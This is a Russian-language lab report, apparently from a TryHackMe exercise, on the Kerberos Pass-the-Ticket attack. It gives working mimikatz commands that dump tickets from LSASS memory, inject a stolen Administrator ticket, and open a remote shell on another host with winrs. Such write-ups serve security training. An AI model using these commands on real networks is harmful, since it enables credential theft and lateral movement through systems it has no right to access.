# Отчёт: Pass-the-Ticket (Kerberos)

## Описание атаки

Pass-the-Ticket (PtT) — использование украденных Kerberos билетов (TGT или TGS) для аутентификации на сетевых ресурсах без знания пароля.

## Как это работает

1. Kerberos использует билеты для аутентификации
2. TGT (Ticket Granting Ticket) позволяет запрашивать доступ к любым сервисам
3. TGS (Ticket Granting Service) даёт доступ только к конкретному сервису
4. Если украсть билет из памяти LSASS, его можно внедрить в свою сессию

## Где взять билеты

**Требуемые права:** Administrator (SYSTEM) для извлечения TGT, можно и без прав для внедрения

### Извлечение всех билетов из памяти

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

Билеты сохраняются в файлы `.kirbi` в текущей директории.

## Внедрение билета

**Требуемые права:** не требуются (можно делать от обычного пользователя)

```cmd
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

## Проверка внедрённых билетов

```cmd
klist
```

## Использование для lateral movement

После внедрения билета любая утилита (winrs, psexec, xfreerdp) будет использовать его для аутентификации.

```cmd
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

---
